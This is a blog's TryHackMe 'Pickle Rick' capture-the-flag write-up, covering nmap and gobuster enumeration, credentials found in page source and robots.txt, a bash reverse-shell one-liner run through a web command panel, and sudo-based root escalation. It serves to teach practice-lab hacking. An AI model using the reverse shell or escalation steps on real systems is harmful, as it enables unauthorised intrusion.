@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>TryHackMe - Pickle Rick Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="TryHackMe - Pickle Rick Writeup" />
+<meta property="og:description" content="Link : https://tryhackme.com/room/picklerick
+Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command
+1 nmap -sC -sV -oN nmap/initial &lt;machine ip&gt; Explaining the nmap scan: -sC	:= scan using nmap default script -sV	:= scan for version -oN := output in normal format Nmap scan shows us. There are 2 ports open ssh and HTTP." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shafiqaiman.com/posts/thm/pickle_rick/" /><meta property="og:image" content="https://shafiqaiman.com/posts/thm/pickle_rick/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-10T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shafiqaiman.com/posts/thm/pickle_rick/featured.png"/>
+<meta name="twitter:title" content="TryHackMe - Pickle Rick Writeup"/>
+<meta name="twitter:description" content="Link : https://tryhackme.com/room/picklerick
+Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command
+1 nmap -sC -sV -oN nmap/initial &lt;machine ip&gt; Explaining the nmap scan: -sC	:= scan using nmap default script -sV	:= scan for version -oN := output in normal format Nmap scan shows us. There are 2 ports open ssh and HTTP."/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/thm/pickle_rick/" /><link rel="prev" href="https://shafiqaiman.com/posts/thm/vulnversity/" /><link rel="next" href="https://shafiqaiman.com/posts/thm/lazy_admin/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe - Pickle Rick Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/shafiqaiman.com\/posts\/thm\/pickle_rick\/"
+        },"genre": "posts","keywords": "gobuster","wordcount":  522 ,
+        "url": "https:\/\/shafiqaiman.com\/posts\/thm\/pickle_rick\/","datePublished": "2021-07-10T00:00:00+00:00","dateModified": "2021-07-10T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SHAFIQAIMAN"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TryHackMe - Pickle Rick Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SHAFIQAIMAN</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="10-07-2021">10-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;522 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#explaining-the-nmap-scan">Explaining the nmap scan:</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://tryhackme.com/room/picklerick" target="_blank" rel="noopener noreffer ">Link : https://tryhackme.com/room/picklerick</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -sC -sV -oN nmap/initial &lt;machine ip&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="explaining-the-nmap-scan">Explaining the nmap scan:</h3>
+<ul>
+<li>-sC	:= scan using nmap default script</li>
+<li>-sV	:= scan for version</li>
+<li>-oN := output in normal format</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/2.png"
+        data-srcset="/posts/thm/pickle_rick/2.png, /posts/thm/pickle_rick/2.png 1.5x, /posts/thm/pickle_rick/2.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/2.png"
+        title="2" width="700" height="280" /></p>
+<p>Nmap scan shows us. There are 2 ports open ssh and HTTP. First, I’m gonna check port 80 because not common for ssh to log in as anonymous. Let’s check it out.</p>
+<p>Cool! we got this web page</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/3.png"
+        data-srcset="/posts/thm/pickle_rick/3.png, /posts/thm/pickle_rick/3.png 1.5x, /posts/thm/pickle_rick/3.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/3.png"
+        title="3" width="700" height="327" /></p>
+<p>This is the very first thing I’m gonna do. You always need to check the page source code maybe we can find something interesting. Well, yes we did.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/4.png"
+        data-srcset="/posts/thm/pickle_rick/4.png, /posts/thm/pickle_rick/4.png 1.5x, /posts/thm/pickle_rick/4.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/4.png"
+        title="4" width="375" height="580" /></p>
+<p>In this page source. We can see the comment says <code>Note to self, remember username!</code>. We have a username. Unfortunately, we don’t know where to log in as this username.</p>
+<p>Well, I’m gonna run gobuster. Gobuster is a tool to find the hidden directory on this website</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gobuster dir -u http://&lt;machine ip&gt; -w /path/to/wordlist.txt -x php,.txt,.html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/5.png"
+        data-srcset="/posts/thm/pickle_rick/5.png, /posts/thm/pickle_rick/5.png 1.5x, /posts/thm/pickle_rick/5.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/5.png"
+        title="5" width="700" height="388" /></p>
+<p>The scan result shows us the hidden directory called <code>login.php</code> with status code 200 and we also found <code>robots.txt</code></p>
+<p>Let’s take a look at the login.php and robots.txt</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/6.png"
+        data-srcset="/posts/thm/pickle_rick/6.png, /posts/thm/pickle_rick/6.png 1.5x, /posts/thm/pickle_rick/6.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/6.png"
+        title="6" width="700" height="296" /></p>
+<p>If you remember. In the beginning, we found the username. If you look closely at the robots.txt it looks like something, maybe it is the password. Let’s try it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/7.png"
+        data-srcset="/posts/thm/pickle_rick/7.png, /posts/thm/pickle_rick/7.png 1.5x, /posts/thm/pickle_rick/7.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/7.png"
+        title="7" width="392" height="266" /></p>
+<p>wow! it’s working. We can see on this page, we can run the command in that box. So, I’m gonna execute reverse shell on that to make an easy foothold.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/8.png"
+        data-srcset="/posts/thm/pickle_rick/8.png, /posts/thm/pickle_rick/8.png 1.5x, /posts/thm/pickle_rick/8.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/8.png"
+        title="8" width="700" height="243" /></p>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/9.png"
+        data-srcset="/posts/thm/pickle_rick/9.png, /posts/thm/pickle_rick/9.png 1.5x, /posts/thm/pickle_rick/9.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/9.png"
+        title="9" width="593" height="295" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c ‘bash -i &gt;<span class="p">&amp;</span> /dev/tcp/&lt;your ip&gt;/&lt;listening port&gt; 0&gt;<span class="p">&amp;</span>1’
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/10.png"
+        data-srcset="/posts/thm/pickle_rick/10.png, /posts/thm/pickle_rick/10.png 1.5x, /posts/thm/pickle_rick/10.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/10.png"
+        title="10" width="700" height="175" /></p>
+<p>First, what I like to do is run the <code>sudo -l</code> command to check sudo permission/capability.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/11.png"
+        data-srcset="/posts/thm/pickle_rick/11.png, /posts/thm/pickle_rick/11.png 1.5x, /posts/thm/pickle_rick/11.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/11.png"
+        title="11" width="700" height="183" /></p>
+<p>After, we ran that command. It says “(ALL) NOPASSWD: ALL”. This says</p>
+<blockquote>
+<p>‘Hey dude! you can run sudo without a password at all and be free to use it’.</p>
+</blockquote>
+<p>This happens because of not properly configure the user and root.</p>
+<p>Now, Let’s try find the first ingredient Rick needs.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/12.png"
+        data-srcset="/posts/thm/pickle_rick/12.png, /posts/thm/pickle_rick/12.png 1.5x, /posts/thm/pickle_rick/12.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/12.png"
+        title="12" width="700" height="326" /></p>
+<p>Ok. We just have the first ingredient. However, We need two more the ingredient. So, let’s try to see any user home directory exists. Look like the user <code>rick</code> exists. Let’s try to check it out.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/13.png"
+        data-srcset="/posts/thm/pickle_rick/13.png, /posts/thm/pickle_rick/13.png 1.5x, /posts/thm/pickle_rick/13.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/13.png"
+        title="13" width="647" height="320" /></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>As we know, This user <code>www-data</code> can run sudo without a password at all. This means we can be root by running the command sudo su.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/pickle_rick/14.png"
+        data-srcset="/posts/thm/pickle_rick/14.png, /posts/thm/pickle_rick/14.png 1.5x, /posts/thm/pickle_rick/14.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/pickle_rick/14.png"
+        title="14" width="464" height="211" /></p>
+<p>WoW! We just solve this box with ease and gain a lot of knowledge.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot today. This shows us how dangerous it is if you don’t configure something properly. In this case, the sudo command. However, An attacker can be root in your machine if they have a good and strong foothold. Well, before an attacker can access make sure you have to patch all of your weak systems. In this machine, the website can execute bash. This is bad and an attacker easily got the reverse shell.</p>
+<p>This room so much fun and I hope you guys have fun and learn something new today.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 10-07-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/thm/pickle_rick/" data-title="TryHackMe - Pickle Rick Writeup" data-via="_shafiqaiman_" data-hashtags="gobuster"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/thm/pickle_rick/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/thm/pickle_rick/" data-title="TryHackMe - Pickle Rick Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/thm/pickle_rick/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/gobuster/">gobuster</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/thm/vulnversity/" class="prev" rel="prev" title="TryHackMe - Vulnversity Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>TryHackMe - Vulnversity Writeup</a>
+            <a href="/posts/thm/lazy_admin/" class="next" rel="next" title="TryHackMe - Lazy Admin Writeup">TryHackMe - Lazy Admin Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
